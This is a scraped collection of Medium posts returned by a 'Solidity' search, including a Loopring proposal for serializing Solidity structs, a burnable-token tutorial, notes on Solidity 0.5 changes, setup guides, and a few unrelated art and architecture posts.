solidity structs.The ChallengeSolidity is a language for writing smart contracts on Ethereum platform. It offers a set of built-in types. When writing smart contract, people usually define their public/external API like this (example from Loopring Protocol 1.0):function submitRing(  address[2][] addressList,  uint[7][] uintArgsList,  uint8[2][] uint8ArgsList,  bool[] buyNoMoreThanAmountBList,  uint8[] vList,  bytes32[] rList,  bytes32[] sList,  address ringminer,  address feeRecepient) public;The issues are:Many of these parameters are optional, engineers at Loopring usually has to give these optional parameters their default values in a submitRing transaction. Therefore the optional parameters\u2019 default values do consume gas, we want to avoid it.There is a limit on the number of parameters each function can have. Therefore, in Loopring 1.0, we have to organize parameters of the same type into an array and give it a terrible name, such as uint8ArgsList. We want to name each parameter with its own desired name to make the code more readable.There is no backward compatibility if we change the method\u2019s parameters in a newer version.Expected SolutionWe learn from Google\u2019s Protocol Buffer (protobuf) and Facebook\u2019s thrift, and imagine we can define our domain models in a protobuf/thrift like language and write a compiler to generate a set of solidity files that contains our domain models in solidity struct as well as a serialization function to serialize the struct into a byte array (bytes) and a deserialization function to deserialize a bytes into the domain struct.Let\u2019s take the following struct in solidity as an example:struct SimpleOrder {  address   owner;  address   tokenS;  address   tokenB;  uint      amountS;  uint      amountB;  uint      validSince;  uint tokenSpendableS;  uint tokenSpendableFee;}function submitSimpleOrder (  address   owner,  address   tokenS,  address   tokenB,  uint      amountS,  uint      amountB,  uint      validSince,  uint tokenSpendableS,  uint tokenSpendableFee) {  SimpleOrder order = new SimpleOrder(    owner,    tokenS,    tokenB,    amountS,    amountB,    validSince,    tokenSpendableS,   tokenSpendableFee);  // ...}We expect that all fields are optional. We can define such a struct in a prosol language yet to be invented:// simple_order.prosolstructure SimpleOrder {  address   owner = 1;  address   tokenS = 2;  address   tokenB = 3;  uint      amountS = 4;  uint      amountB = 5;  uint      validSince = 6;  uint tokenSpendableS = 7;  uint tokenSpendableFee = 8;}The numbers behind field names are the fields\u2019 indices which uniquely identify the fields in the serialized byte array, not their names.A compiler can be made available to compile simple_order.prosol into a file called generated/SimpleOrderLib.sol with the following content:pragma solidity 0.4.24;pragma experimental \"v0.5.0\";pragma experimental \"ABIEncoderV2\";import \"path/to/Prosol.sol\"; // this has some basic methods./// Automatically generated from simple_order.prosol/// Do not change manually.library SimpleOrderLib {  struct SimpleOrder {    address   owner;  // pos=1;    address   tokenS;  // pos=2;    address   tokenB;  // pos=3;    uint    amountS;  // pos=4;    uint    amountB;  // pos=5;    uint    validSince;  // pos=6;    uint tokenSpendableS;  // pos=7;    uint tokenSpendableFee;  // pos=8;  }function toBytes(SimpleOrder simpleOrder)    pure    returns (bytes output) {    // generated code below  }function toSimpleOrder(bytes input)    pure    returns (SimpleOrder simpleOrder) {    // generated code below  }}With this generated library, we an change the submitSimpleOrder function to something like this:pragma solidity 0.4.24;import \"generated/SimpleOrderLib.sol\";using SimpleOrderLib for bytes;using SimpleOrderLib for SimpleOrder;function submitSimpleOrder(bytes input) {  SimpleOrderLib.SimpleOrder order = input.toSimpleOrder();  bytes output = order.toBytes();  // ...}Default ValuesWhen serializing a struct into a bytes, all fields with default values should be omitted to save space.Support Embedded StructureThe compiler also needs to support embedded structures. Substructures should have their own indexing space. For example:// simple_order.prosolstructure Spendables {  uint tokenSpendableS = 1;  uint tokenSpendableFee = 1;}structure SimpleOrder {  address   owner = 1;  address   tokenS = 2;  address   tokenB = 3;  uint      amountS = 4;  uint      amountB = 5;  uint      validSince = 6;  Spendables spendables = 7;}We may need to restrict the number of fields per structure in order to make sure the indices themselves do not take too many bits. After all, reducing the size of transaction data payload and gas consumption is our objective.Support Repeated\u00a0FieldsRepeated fields should be compiled into an array. In the example below, the spendables fields should have a solidity type of Spendables[].// simple_order.prosolstructure SimpleOrder {  address   owner = 1;  address   tokenS = 2;  address   tokenB = 3;  uint      amountS = 4;  uint      amountB = 5;  uint      validSince = 6;  repeated Spendables spendables = 7;}", "responses": ""}, {"title": "Call for Sponsorship of a local Ethereum event: Solidity 0.5 walkthrough at Progressbar in Bratislava, Slovakia", "author_name": "makoto_inoue", "link": "https://medium.com/wearekickback/call-for-sponsorship-of-a-local-ethereum-event-solidity-5-0-91b9e8b2f453?source=search_post", "post_date": "Nov 26, 2018", "readtime": "5 min read", "upvotes": "39", "content": "Call for Sponsorship of a local Ethereum event: Solidity 0.5 walkthrough at Progressbar in Bratislava, Slovakiamakoto_inoueBlockedUnblockFollowFollowingNov 26, 2018Rich meetups, poor meetupsProgressbar in Bratislava, SlovakiaCall for sponsorship of their upcoming Event\u00a0: Solidity 0.5 walkthroughRich meetups, poor meetups.During DevCon4, we hosted a series of events through our platform and many people liked our simple concept demonstrating the power of smart contract (or the simple fact that they got more ETH just by turning up).More importantly, we are very grateful that the majority of event organisers paid for our service (1 euro per 1 RSVP during DevCon4 which is subject to change).The amount is decided through various conversations with dozens of organisers who filled in our early access form. While some organisations had enough budget to cover our fee, it is not a trivial amount for others who have less or no sponsorship.We also received multiple requests for paid events. Their intentions are mostly to cover the cost of drinks and snacks rather than intending to make a profit. This means that the difference between free events and small fee events are just the lack of enough sponsorship, as newly formed meetups or rural meetups lacks enough stream of sponsorship as compared to big meetups in big cities. Is there any way we can help these organisers to get enough sponsorship so that they can afford to pay us while making the meetup itself more sustainable?That\u2019s pretty much what I was thinking throughout DevCon4 and that\u2019s when I met Matej who runs a hackerspace & co-working space called \u201cProgressbar\u201d in Bratislava, Slovakia.Progressbar in Bratislava, SlovakiaBratislava has a nice balance between huge city & village. Everyday something is happening in Bratislava\u200a\u2014\u200aevents, concerts, art expositions, parties, meetups so on. Bratislava has lots of parks & green areas where you can go & feel like you\u2019re in nature & escape the rush of the \u201cworld\u201d\u00a0. Bratislava has really nice historical city centre with lots of really good restaurants that are affordable, plus our co-working space is in this area.A legendary hackerspace in Bratislava, Progressbar is the centre of the cryptocurrency community in Slovakia with the biggest draw for tech people\u200a\u2014\u200ahaving organized Bitcoin events back in the days since 2012, or hosting Vitalik way before it was cool.Progressbar is a space where you can fully concentrate on your work. You basically have everything you need\u200a\u2014\u200awork there & enjoy nice street view on Dunajska street, do pull ups on the pull up bar, have meetings in our new glass meeting room with whiteboard & projector, take calls in a call room, rest in our chill zone on the bags & couch area, organize event & meet ups as we have all necessary equipment like projectors, microphones, speakers, lots of chairs & tables (ideal for tech meetup). Progressbar is mainly a co-working space, but in the evening the space hosts events. Sometimes co-workers like to network so they just bring some drinks to the space & have private parties that anyone can be a part of.Recently Progressbar is embracing using public issues for transparency using github issues\u200a\u2014\u200ashowcasing the community over proprietary mediums https://instagram.com/progressbar_sk and our semi-private Progressbar Daily album.Their upcoming events can be found at their events page and facebook page.Progressbar has Python meetups on monthly basis, but anything tech related is welcome. They have hosted a Bitcoin quiz, Cryptowine, Hacktoberfest, Crypto meetup, Stellar meetup, Ethereum meetup, Bitcoin meetup, Machine Learning meetups, Nodeschool Bratislava and recently hosted valuable guests Vlad Zamfir, Amir Taaki and Harry Halpin with great talk about Politics of Cryptoanarchy and Governance. About twice a week there are events in Progressbar. During weekends the space is used by companies that hold trainings there, for example Hemisfera (camp program, where they teach kids to code) was training their new teachers for 3 weekends Progressbar has also been hosting ESA Copernicus as well. In the future they would like to be testbed for Ethereum ecosystem & projects in real world.Call for sponsorship of their upcoming Event\u00a0: Solidity 0.5 walkthroughWe have a joint proposal between Progressbar and Kickback. Matej is currently planning a meetup in Mid December where they dive into the new features of Solidity 0.5 featuring Gleb Urvanov.Speaker: Gleb UrvanovBio: Software developer, qualified specialist in field of information technologies with experience in project management. During the last 7 years has been working as a software engineer for private and state companies, including Ministry of Defence of Russian Federation. Used to work on a team in an Agile environment as well as solitaire, solving critical tasks. Besides extensive experience within different commercial projects, he has won several national awards in scientific and professional areas. A Blockchain enthusiast, Gleb participated in a several cryptocurrency-related startups as a smart contract developer. He has spoken at five international conferences in the field of computer science and was the youngest speaker at the international conference of robotics in Sochi\u200a\u2014\u200a2014The event currently has no sponsorship, but we are currently open to organisations who can sponsor \u20ac300 to cover drinks, foods, and the fee to use Kickback.Matej and I had a bit of brainstorming and here are the list of things we can potentially offer in exchange for the sponsorshipYour company logo on Kickback event pageA few minutes slot to talk about your company (they are planning to livestream using facebook live)If they manage to edit video, have your company logo at the beginning of the videoInterview or articles about your organisation on Kickback (here are the examples)This is a bit of experiment to see if there is any appetite for global blockchain companies and projects to reach out and sponsor remote and locally organised meetups in support of the ecosystem.If you would like to be a sponsor, please contact matej.nemcek@geefu.netNOTE: If you are interested in simply donating than sponsoring an event, you can donate at their donation page.", "responses": ""}, {"title": "How to Create a Burnable Token with Solidity and OpenZeppelin Library", "author_name": "Gaurav Agrawal", "link": "https://medium.com/crowdbotics/how-to-create-a-burnable-token-with-solidity-and-openzeppelin-library-38bd3249d0c7?source=search_post", "post_date": "Nov 6, 2018", "readtime": "3 min read", "upvotes": "5", "content": "How to Create a Burnable Token with Solidity and OpenZeppelin LibraryToken burning increases token value as it decreases the total supply. Here\u2019s how it works, and how to create your own burnable token with OpenZeppelin LibraryGaurav AgrawalBlockedUnblockFollowFollowingNov 6, 2018RecapIn a previous tutorial, we created and created a capped a timebound crowdsale. Now, we review how to create a \u201cburnable token\u201d.What is token\u00a0burning?Token burning implies to reducing the total supply of tokens.But wait, blockchains are immutable. So, how do we do this?Making a burnable token is accomplished by sending tokens to an address whose private keys are not accessible by anyone and subtracting the number from the total supply in our contract.We will continue to build our ExampleToken.sol, which we used in our previous tutorials.Let\u2019s dive into the code:ExampleToken.solFor this tutorial, we are removing thtoken minting feature from our contract and giving it a fixed total supply of 10000. OpenZeppelin library provides BurnableToken.sol. We will import this contract to implement burnable token functionality in our ExampleToken.pragma solidity ^0.4.23;import \"./BasicToken.sol\";contract BurnableToken is BasicToken {event Burn(address indexed burner, uint256 value);  function burn(uint256 _value) public {    _burn(msg.sender, _value);  }function _burn(address _who, uint256 _value) internal {    require(_value <= balances[_who]);balances[_who] = balances[_who].sub(_value);    totalSupply_ = totalSupply_.sub(_value);    emit Burn(_who, _value);    emit Transfer(_who, address(0), _value);  }}BurnableToken exposes burn(uint256 _value) method which is calling an internal _burn(address _who, uint256 _value) method. This internal method is performing the following tasks.Reducing the sender\u2019s token balance\u200a\u2014\u200aIt will reduce the token balance of the account who is executing the transaction. msg.sender is a global variable which represents the account who is executing the transaction.Reducing the token\u2019s total supply\u200a\u2014\u200aThen the method is reducing the total supply of our token by changing the value of _totalSupply variable available in BasicToken.solEmitting Transfer event\u200a\u2014\u200aThis point is noteworthy, as you can see there is no actual transfer to address(0). It\u2019s just emitting an event which shows token is transferred to address(0). This achieves the same results as we are reducing the total supply. Also, if you check the transfer method in BasicToken.sol, you will see that we have a check that restricts anyone to send tokens to address(0).What is address(0)?This represents 0x0000000000000000000000000000000000000000 on ethereum blockchain. It\u2019s also the ethereum genesis address and no-one has its private keys. (You can check how much this address worth.)Making ExampleToken burnableNow, let's see how to implement this on our exampleToken contract.contract ExampleToken is  StandardToken, DetailedERC20, BurnableToken{  constructor(string _name, string _symbol, uint8 _decimals)   DetailedERC20(_name, _symbol, _decimals)  public {   totalSupply_ = 10000;   balances[msg.sender] = 10000;  }}We just need to inherit BurnableToken.sol. That\u2019s it, this will give us full functionality of to burn tokens.As mentioned earlier, we are setting total supply to 10000 and giving it to the person who is deploying our ExampleToken contract.Testing Burnable ExampleTokenOpenZeppelin library is well tested, so we will just add a basic test case to see that everything is working as expected.it('Burn test' , async() => {    await this.token.burn(1000);   const totalSupply = await this.token.totalSupply();   console.log(totalSupply);  assert.equal(totalSupply , 9000); });As you can see, we are burning 1000 tokens and checking if our token supply is now reduced to 9000. You can write more test cases of you own if you\u2019d like. If you need a reference, check my GitHub repository.ConclusionSo we have learned how to create a burnable token using OpenZeppelin library.Token burning is standard practice. It increases the token value as it decreases the Total supply. Coins like BNB (Binance coin) use token burning to increase the value of tokens.In the next part, we will see how to smart contract to pay dividends to token holders. If you have any questions, let us know in comments.You can check, the whole code in my GitHub repository.Starting a new blockchain project, or looking for a Solidity developer?Crowdbotics helps business build cool things with Solidity (among other things). If you have a blockchain project where you need additional developer resources, drop us a line. Crowbotics can help you estimate build time for given product and feature specs, and provide specialized Solidity developers as you need them. If you\u2019re building with Solidity, check out Crowdbotics.", "responses": "1"}, {"title": "Changes to Solidity\u00a00.5", "author_name": "Alex Puig", "link": "https://medium.com/caelumlabs/changes-to-solidity-0-5-68cb9b02ad83?source=search_post", "post_date": "Aug 28, 2018", "readtime": "2 min read", "upvotes": "51", "content": "Changes to Solidity\u00a00.5Alex PuigBlockedUnblockFollowFollowingAug 28, 2018Thanks to Christian Reitwiessner. This is a summary of his last talk. Among many changes made, some warnings became errors in this new version. More changes focusing in safety. Main changes are\u00a0:Explicit visibility\u00a0: Visibility must be specified, it was a warning, now is an errorfunction withdraw() public {\u2026}Constructor syntax\u00a0: Constructor can\u2019t be the name anymore:constructor() public {\u2026.}Emit is now needed for eventsemit Withdrawn();Explicit types. Now var is disallowed and you need to specify the type0.4 \u2192 for (var i=0; i<length; i++)0.5 \u2192 for (uint i=0; i<length; i++)Data Location. To specify a data location is function sum(uint[] a);0.5 \u2192 function sum(uint[] memory a);Storage Pointers have to be initialized and assigned0.4 \u2192 Data p; // valid in 0.4 by default it points to storage0.5 \u2192 participants.length += 1Data storage p = participants[participants.length-1]; // in 0.5Function-scoped variables. Solidity now uses regular scope blocks like c++, not like JavaScript anymore. Only exception being made in the for loop. It allows now to define a variable inside of a scope, which will be freed at the end of the scope, allowing us to pass the limitation of 16 variables per function.0.4 \u2192 i=3;if (false) { uint i;} // This will not work anymore0.5 \u2192 for (uint i = 0\u2026) // This works and you can declare it many times.Functionality Improvementsa.pop(); // for storage arraysabi.encode(\u2026)abi.encodePacked(\u2026)enums and strcts in interfaces", "responses": ""}, {"title": "What is Scilla Programming Language?\u200a\u2014\u200aBetter than Solidity?\u200a\u2014\u200a#TECH", "author_name": "John Saddington", "link": "https://medium.com/@saddington/what-is-scilla-programming-language-better-than-solidity-tech-84b44575807f?source=search_post", "post_date": "Feb 10, 2018", "readtime": "", "upvotes": "1", "content": "What is Scilla Programming Language?\u200a\u2014\u200aBetter than Solidity?\u200a\u2014\u200a#TECHJohn SaddingtonBlockedUnblockFollowFollowingFeb 10, 2018Is Scilla programming language better than solidity? Is this the future?", "responses": ""}, {"title": "A Guide to\u00a0Solidity", "author_name": "Monetha", "link": "https://medium.com/@monetha/a-guide-to-solidity-4f9c217b4660?source=search_post", "post_date": "Mar 19", "readtime": "5 min read", "upvotes": "2", "content": "A Guide to\u00a0SolidityMonethaBlockedUnblockFollowFollowingMar 19Solidity is an object-oriented programming language currently used to write smart contracts on different blockchain platforms, including Ethereum. First proposed by Gavin Wood in 2014, it was later developed by Christian Reitwiessner and some of the core Ethereum contributors.\u00a0\u00a0\u00a0According to Wood, Solidity was designed based on ECMAScript, the standard script used for JavaScript, to make it easier for programmers to write and implement smart contracts on the Ethereum Virtual Machine (EVM).\u00a0\u00a0\u00a0That means if you can use C++, Python, Perl, Java, and other modern programming languages, it will be relatively easy for you to learn Solidity because it contains programming elements found in other languages. These similarities include variables, arithmetic operations, functions, classes, string manipulations, and more.\u00a0\u00a0\u00a0For example, if the C++ language allows you to create some code for \u201cmain function\u201d, Solidity creates a \u201ccontract\u201d in a similar process.\u00a0\u00a0\u00a0Since Solidity is a programming language designed specifically for writing smart contracts, it leaves an official record of transactions that cannot be repudiated. Programmers who are using it to write applications should keep the rules of the EVM in mind.\u00a0\u00a0\u00a0Solidity is the most popular of the programming languages used on the EVM (the others are LLL, Viper, Serpent, and Mutan). Some of its significant advantages compared to the other Ethereum programming languages are:\u2013 It supports complex member variables in smart contracts. Member variables are used in object-oriented programming and are associated with a specific object. Examples of these complex member variables are hierarchical structures and mappings.\u2013 It enables contracts to support inheritance. It is a mechanism in object-oriented programming that bases an object on another object or a class on another class. Inheritance in programming is similar to genetic inheritance: Just as a child inherits the traits of his parents, through inheritance, the programmer reuses the methods and fields of the existing class.\u2013 It has an Application Binary Interface (ABI), an interface between two program modules. One of these program modules is at the level of machine code. In Ethereum, Solidity supports an ABI that facilitates multiple type-safe functions within a single contract. Type safety refers to the process in which the Solidity command line compiler validates and deletes datatypes. If the programmer assigns a wrong datatype to a variable, the compiler will delete the error.Solidity and Smart ContractsA contract is a function\u200a\u2014\u200acollection of code and data\u200a\u2014\u200ain the Ethereum blockchain, written in Solidity and compiled into JSON or binary. After the compilation, the contract is sent to a specific address in the blockchain. Whoever wants to use the deployed contract just submits the correct data along with the Ether needed to pay for it.\u00a0\u00a0\u00a0Smart contract functions can be used to define conditions that all the parties using the contract agree upon. Smart contracts enable parties to deal and communicate with each other directly, eliminating the need for a middleman.\u00a0\u00a0\u00a0This feature gives developers vast opportunities to create things, such as new markets or registries of debts. All of these are possible as long as there is a consensus in the network that will validate all transactions.\u00a0\u00a0\u00a0Anyone can send a smart contract into the decentralized network, provided they pay a fee, which is proportional to the storage size of the code.Ethereum then stores the items in one of three places.\u2013 Storage\u200a\u2014\u200athe place where all the contract\u2019s state variables can be found. A state variable is a set of variable that describes the mathematical state of a dynamic system. Each contract includes a storage which persists between function calls.\u2013 Memory\u200a\u2014\u200awhere temporary values are placed and erased between function calls. It is, therefore, advisable to use memory to store everything that is only temporary.\u2013 Stack\u200a\u2014\u200ait works similarly to memory and is almost free. However, the stack has a minimum of 1024 items but only the top 16 items are easily accessible.Solidity OperatorsSolidity has four value types\u200a\u2014\u200atypes that are always passed by a value. This means that these types are always copied when utilized in assignments or for arguments. Furthermore, these types can interact with each other in expressions with operators.\u00a0\u00a0\u00a0Operators are also divided into four categories\u200a\u2014\u200aarithmetic, incremental, bitwise, and logical.Arithmetic OperatorsAs the name suggests, these are math operations, like those used in most programming languages. Solidity also has an exponential operator in this category.\u2013 Addition: x + y\u2013 Subtraction: x\u200a\u2014\u200ay\u2013 Division: x / y\u2013 Multiplication: x * y\u2013 Modulo/remainder: x%yIncremental OperatorsIn Solidity, incremental operators are:\u2013 A++\u2013 a-\u2013 ++a\u2013 -a\u2013 a+=1\u2013 a=a+1Bitwise Operators\u2013 Bitwise AND\u200a\u2014\u200a&\u2013 Bitwise inclusive OR\u200a\u2014\u200a|\u2013 Bitwise XOR (exclusive OR) ^\u2013 Bitwise NOT\u200a\u2014\u200a~\u2013 Bitwise right shift \u2192>\u2013 Bitwise left shift\u200a\u2014\u200a<<Logical Operators\u2013 Logical negation\u00a0!\u2013 Logical AND &&\u2013 Logical OR ||\u2013 Equality = =\u2013 Not equal\u00a0! =Solidity Value TypesBooleanThis value type uses the keyword \u201cbool,\u201d and its two possible values are constants: \u201ctrue\u201d and \u201cfalse.\u201d This value type uses logical operators, with the logical OR (| |) and the logical AND (& &) applying the common short-circuiting rules.\u00a0\u00a0\u00a0For example, in the expression m(x) | | n(y), if m(x) evaluates to true, n(y) will not be assessed whether it has a positive or negative side effect.IntegersThis value type uses the keywords \u201cint\u201d and \u201cuint\u201d\u200a\u2014\u200asigned and unsigned integers, respectively. An unsigned integer can have a large positive value while a signed integer identifies whether the number is positive or negative using the left-most-bit. Signed integers can also hold numbers with both positive and negative values.These integers can have different values; thus, if you see keywords like uint8 to uint256 in steps of 8, that means they are unsigned integers of 8 up to 256 bits. Integers use bitwise and arithmetic operators as well as comparisons and shift operators.AddressThis value type uses the keyword \u201caddress\u201d and has two very similar formats:\u00a0Address\u200a\u2014\u200athis has a 20-byte value size, which is the size of an Ethereum address.\u00a0Address payable\u200a\u2014\u200athe same as the \u201caddress\u201d format but uses the \u201ctransfer\u201d and \u201csend\u201d functions.String LiteralsThese values are written using either single or double quotes: \u2018foo\u2019 or \u201cbar.\u201d They do not imply trailing zeroes like the C++ language. Strings literals use the backslash symbol to escape special characters like the ones below:\u2013 Backslash \\\\\u2013 Backspace \\b\u2013 Escapes an actual newline \\<newline>\u2013 Carriage return \\r\u2013 Double quote \\\u201d\u2013 Form feed \\f\u2013 Hex escape, see below \\xNN\u2013 Newline \\n\u2013 Single quote \\\u2019\u2013 Tab \\t\u2013 Vertical tab \\v\u2013 Unicode escape, \\uNNN", "responses": ""}, {"title": "", "author_name": "Don Winiecki", "link": "https://medium.com/prose-poetry-flash-fiction/nerdrum-s-solidity-ef0f98963278?source=search_post", "post_date": "Jun 27, 2015", "readtime": "", "upvotes": "", "content": "\u201cNerdrum\u2019s Cloud (ANA20150408090443)\u201d. (2015). 46\"w x 28\"h. Don Winiecki/ANANerdrum\u2019s SolidityDon WinieckiBlockedUnblockFollowFollowingJun 27, 2015Eerily floating beyond, these clouds\u200a\u2014\u200awith their atmospheric impasto and subtle and creamy solar Ochre and faint and warm terrestrial Terra Rosa edges anchoring them to the muted-blue sky\u200a\u2014\u200aappeared more solid even than the birds and drones that flew\u200a\u2014\u200aalmost frozen in the distance\u200a\u2014\u200aamong them\u200a\u2014\u200aespecially in the low dusky light at this very moment.When I was a boy I thought clouds like this were made of finely whipped marshmallow\u200a\u2014\u200aso finely whipped that they could be suspended in the warm air rising from a factory behind the hazy verdant hill on the horizon that must have made them\u200a\u2014\u200areflecting the sun on their tops and the scorched earth below. This was something my older brother and his then-adolescent friends thought was laughably absurd.Yet there they are again, teasing memory and pushing me deeper into my ownmost self. I wonder what my brother and his friends would say about them now?\u201cNerdrum\u2019s Solidarity (ANA20150408090443)\u201d, 2015, 44\" x 28\", Don Winiecki/ANA", "responses": ""}, {"title": "Vyper Coding Language to Take On Solidity\u200a\u2014\u200aMore Secure Smart Contracts?", "author_name": "John Saddington", "link": "https://medium.com/@saddington/vyper-coding-language-to-take-on-solidity-more-secure-smart-contracts-ffd6b6bd1905?source=search_post", "post_date": "Jul 11, 2018", "readtime": "", "upvotes": "", "content": "Vyper Coding Language to Take On Solidity\u200a\u2014\u200aMore Secure Smart Contracts?John SaddingtonBlockedUnblockFollowFollowingJul 11, 2018Vyper is going to disrupt Solidity\u2026 or, will it?", "responses": ""}, {"title": "University of Iowa Museum of Art: Rectilinear Solidity / Interconnected Voids", "author_name": "BNIM", "link": "https://medium.com/@BNIM/university-of-iowa-museum-of-art-rectilinear-solidity-interconnected-voids-9b80e9cf62d1?source=search_post", "post_date": "Dec 6, 2017", "readtime": "2 min read", "upvotes": "", "content": "University of Iowa Museum of Art: Rectilinear Solidity / Interconnected VoidsBNIMBlockedUnblockFollowFollowingDec 6, 2017The University of Iowa Museum of Art (UIMA) is conceived as a rectilinear solid interrupted by interconnected voids that form the protective and respectful home for the display, conservation, and storage of the collection while providing light-filled, interconnected volumes that emotionally, visually, and physically guide patrons as they experience the Museum.The articulated voids provide exterior exhibition spaces, educational areas, and horizontal and vertical circulation pathways; all intertwined by a three-story, light-filled exterior gallery comprising the core of the Museum and permeating the entirety of the experience.Recalling the timeless academic and cultural brick masonry buildings of Alvar Aalto, Louis Khan, and Eero and Eliel Saarinen, the exterior of the Museum is clad in brick masonry to complement the masonry characteristics of neighboring structures, and to convey the importance of the timelessness and stability of the collection housed within.Through a composition of alternating brick screens and textures that articulate the internal organization, the Museum fa\u00e7ade becomes transformative and animated by the daily and seasonal changes in exterior daylight quality and quantity\u200a\u2014\u200acreating oscillating levels of reflectance, shadow, and animation.A dark, warm brick has been selected to contrast the predominantly red brick of the surrounding buildings and to clearly delineate the significance of the Museum in the hierarchy of buildings on campus while creating a meaningful dichotomy with the white-light-filled interiors and warm wood detailing.Originally posted to bnim.com by Rod Kruse, Levi Robb, and Carey Nagle.", "responses": ""}, {"title": "Flattening your Solidity\u00a0files", "author_name": "Qayyum Rajan", "link": "https://medium.com/@kayuzee/flattening-your-solidity-files-702dec89f0bd?source=search_post", "post_date": "Feb 18", "readtime": "2 min read", "upvotes": "4", "content": "Flattening your Solidity\u00a0filesQayyum RajanBlockedUnblockFollowFollowingFeb 18This article is geared towards those that are beginning to interact with smart contracts in ethereum.I\u2019ve been through this a few times\u200a\u2014\u200aand for those just starting in the space\u200a\u2014\u200athis can somewhat be an annoying process\u200a\u2014\u200aespecially when trying to get verified on Etherscan.ioTypically your files will be in a combination of subfolders\u200a\u2014\u200aand this article is meant to give a more detailed overview for those that want to get their contracts source code verified. We will do this from scratch for those not familiar with using npm and the terminal.We will be using the POA Solidity Flattener found here (clone this to your local directory): https://github.com/poanetwork/solidity-flattenerFirst thing first is install NPM here.To use some reference files\u200a\u2014\u200awe can use some token contracts from openzepplin who provides an awesome collection of free smart contracts.Open in Github Desktop, download the zip or clone the repo\u200a\u2014\u200awhatever works for ya (I personally like Github Desktop).Get the\u00a0repoWe can use contracts/token/ERC20/ERC20Mintable.sol\u200a\u2014\u200aThis is a standard mintable token.Mintable tokenSee how it starts with those two imports? Those are referencing other contracts in the repo. When it comes time to verify your source code, easy deployment of small contracts etc\u200a\u2014\u200awhat you want is a flattened file which holds all the imports in a single contract.Open up your terminal and cd into your poa network folder (soldity-flattener) and then enter npm install.You can now simply enter \u2018npm start\u2019 and add the file name of your smart contract (.sol file)Get startedSee that out folder\u2026Boom\u200a\u2014\u200aflat file baby", "responses": ""}, {"title": "", "author_name": "Dave Kajpust", "link": "https://medium.com/@davekaj/basically-if-you-taught-yourself-solidity-for-6-months-you-would-for-sure-be-able-to-get-a-job-f6c4e7a4f8aa?source=search_post", "post_date": "Jan 23", "readtime": "", "upvotes": "1", "content": "Dave KajpustBlockedUnblockFollowFollowingJan 23Basically, if you taught yourself Solidity for 6 months you would for sure be able to get a job. But, this article is over a year old, and that isn\u2019t completely true anymore.Solidity is in less demand because the market is so cold. It will probably pick back up in the future. But if you want to get hired, most companies right now would want to see some history of coding work experience.But that is just my best guess! Anything is still possible\u00a0:)", "responses": ""}, {"title": "Solhint: An Advanced Linter for Ethereum\u2019s Solidity", "author_name": "Altoros", "link": "https://medium.com/altoros-blog/solhint-an-advanced-linter-for-ethereums-solidity-e203a2cbb1be?source=search_post", "post_date": "Dec 7, 2017", "readtime": "", "upvotes": "", "content": "Solhint: An Advanced Linter for Ethereum\u2019s SolidityAltorosBlockedUnblockFollowFollowingDec 7, 2017The linting solutions available for detecting code vulnerabilities of the Solidity programming language\u200a\u2014\u200aunderlying smart contracts in Ethereum\u200a\u2014\u200amostly focus on the code compliance with the best linting practices. This blog post overviews a comprehensive Solhint linter that allows for detecting syntax-related security code vulnerabilities. Covering a wide range of validation rules, the tool also enables developers to add new ones, while complying with the Solidity style guide and granting 2x\u20134x boost in performance.Read the full article on ProtoFire\u2019s blog:Solhint: An Advanced Linter for Ethereum\u2019s SolidityThe linting solutions available for detecting code vulnerabilities of the Solidity programming language\u200a\u2014\u200aunderlying\u2026medium.com", "responses": ""}, {"title": "Understanding the \u201cStack Too Deep\u201d Error in\u00a0Solidity", "author_name": "Aventus Network", "link": "https://levelup.gitconnected.com/stack-too-deep-error-in-solidity-ca83326ff0f0?source=search_post", "post_date": "Jan 7", "readtime": "16 min read", "upvotes": "50", "content": "Understanding the \u201cStack Too Deep\u201d Error in\u00a0SolidityLearn how the Ethereum Virtual Machine manages the stack and how the common Stack Too Deep error can occur in your Solidity\u00a0codeAventus NetworkBlockedUnblockFollowFollowingJan 7Happy New Year and may we all have great accomplishments in 2019! Aventus is welcoming you back from the winter holidays with a post related to errors in Solidity, by our very own, Alex Pinto.", "responses": ""}, {"title": "Ethereum Solidity Development on\u00a0Windows", "author_name": "Andy Octavian", "link": "https://medium.com/@AndroidAdvance/ethereum-solidity-development-on-windows-a4cf8daf5fc5?source=search_post", "post_date": "Jun 3, 2018", "readtime": "2 min read", "upvotes": "", "content": "Ethereum Solidity Development on\u00a0WindowsAndy OctavianBlockedUnblockFollowFollowingJun 3, 2018I\u2019m tired of the Macbook\u2019s shitty keyboard. I\u2019m switching to Windows.\u00a0(Why not Linux: I hate the fonts that Linux have and no matter how much I try to tweak them, I still find the Windows ones better)====================So here it is how to do it in Windows.Step #1:Install IntellJ Idea Community Edition (if you don\u2019t have it already)Install the Solidity Plugin (if you don\u2019t have it already)Install the Batch PluginStep #2:Install Chocolatey via https://chocolatey.org/You have to copy paste in an admin console some text.Step #3:In an admin powershell write:$ choco install nodejs.install$ choco install git //optional if you don't have it alreadyStep #4:$ npm install -g npm$ npm install -g truffleOptional install Ganache http://truffleframework.com/ganache/Step #5:Learn how to use truffle (if you don\u2019t know it). Then create a\u00a0.bat file named compile.bat\"%ProgramFiles%\\nodejs\\node.exe\"  %APPDATA%\\npm\\node_modules\\truffle\\build\\cli.bundled.js compileyou can create one with deploy too.Step #6:On Run configurations add a new Batch config, pointing to your compile.bat, and your working directory. (and check the \u201cSingle instance only\u201d)Congratulations, now you can compile Solidity with one click.Step #7:\u00a0???Step #8:\u00a0ProfitGive this post a clap \u2764 to have good luck in crypto this year\u00a0\u2764", "responses": ""}, {"title": "Sintaxis, Scams y Solidity: Una Entrevista con Hans\u00a0Svensson", "author_name": "\u00e6ternity", "link": "https://blog.aeternity.com/sintaxis-scams-y-solidity-una-entrevista-con-hans-svensson-356ebb3c1d13?source=search_post", "post_date": "Jan 11", "readtime": "4 min read", "upvotes": "", "content": "Sintaxis, Scams y Solidity: Una Entrevista con Hans\u00a0SvenssonHans comparti\u00f3 su punto de vista sobre la programaci\u00f3n funcional, consensus y si blockchain realmente cambiar\u00e1 o no el\u00a0mundo.\u00e6ternityBlockedUnblockFollowFollowingJan 11Con m\u00e1s de 15 a\u00f1os de experiencia en la programaci\u00f3n Erlang, Hans Svensson es un especialista en verificaci\u00f3n de modelos para programas concurrentes. Ha implementado los protocolos CAN y LIN y ha trabajado como experto en QuickCheck, probando SSL, Riak, protocolos automotrices, protocolos de telecomunicaciones y varios otros sistemas distribuidos. Ha implementado la sem\u00e1ntica de Erlang y conoce los rincones de VM. Como autor de varios libros con concurrencia como tema unificador, tiene un doctorado en pruebas, verificaci\u00f3n de modelos y verificaci\u00f3n de programas Erlang. Hans 